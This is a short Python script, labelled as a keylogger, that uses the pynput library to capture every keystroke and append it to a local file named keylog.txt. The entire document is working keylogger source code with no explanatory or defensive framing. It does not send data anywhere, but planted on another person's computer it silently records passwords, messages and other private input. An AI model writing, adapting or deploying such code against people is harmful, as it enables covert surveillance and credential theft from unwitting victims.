from pynput import keyboard

def on_press(key):
    with open("keylog.txt", "a") as file:
        try:
            file.write(f"{key.char}")
        except AttributeError:
            file.write(f"[{key}]")

# Start keylogger
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()